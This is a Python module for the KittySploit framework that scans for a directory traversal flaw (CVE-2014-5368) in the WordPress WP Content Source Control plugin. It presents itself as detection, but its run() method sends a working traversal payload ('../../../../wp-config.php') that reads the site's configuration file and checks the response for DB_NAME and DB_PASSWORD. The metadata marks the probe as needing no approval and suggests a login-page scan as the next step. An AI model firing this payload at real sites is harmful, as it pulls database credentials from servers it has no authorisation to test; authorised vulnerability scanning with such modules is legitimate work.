#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the file_get_contents function in downloadfiles/download."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin WP Content Source Control - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in the file_get_contents function in downloadfiles/download.php in the WP Content Source Control (wp-source-control) plugin 3.0.0 and earlier for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the path parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'wordpress', 'wp-plugin', 'lfi', 'edb', 'seclists', 'wp_content_source_control_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-5368',
            'https://www.exploit-db.com/exploits/39287',
            'http://seclists.org/oss-sec/2014/q3/417',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/95374',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-5368',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress Plugin WP Content Source Control - Directory Traversal detected",
                path='/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php',
            )
            return True
        return False

